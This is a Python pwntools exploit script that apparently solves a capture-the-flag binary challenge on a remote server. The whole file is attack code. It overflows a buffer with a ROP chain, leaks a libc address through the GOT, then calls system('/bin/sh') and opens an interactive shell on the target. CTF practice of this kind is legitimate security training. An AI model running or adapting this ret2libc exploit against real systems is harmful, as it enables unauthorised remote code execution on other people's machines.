from pwn import *

libc = ELF("./lib/libc.so.6")
context.binary = elf = ELF("./chall")
# p = process("./chall")
p = remote("34.124.157.94", 32110)

gadget1 = unpack(asm("pop rdi"), "all")
gadget2 = unpack(asm("pop rsi"), "all")

p.sendlineafter(b"(y/n): ", b"y")
p.sendlineafter(b"Number 1: ", str(gadget1).encode())
p.sendlineafter(b"Number 2: ", str(gadget2).encode())

pop_rdi = 0x401428+1
pop_rsi = 0x401428+3

# gdb.attach(p)
p.sendlineafter("magic word? ", fit({0: b"pleaseeeeeee\x00", 280: [pop_rdi, elf.got.putchar, pop_rsi, 0xdeadbeef, elf.sym.print_stuff, elf.sym.main]}))

libc.address = unpack(p.recvuntil(b"Before", drop=True), "all") - libc.sym.putchar

log.info(f"libc base @ {hex(libc.address)}")

p.sendlineafter(b"(y/n): ", b"n");
p.sendlineafter("magic word? ", fit({0: b"pleaseeeeeee\x00", 280: [pop_rdi, next(libc.search(b"/bin/sh")), pop_rsi+1, libc.sym.system]}))

p.interactive()
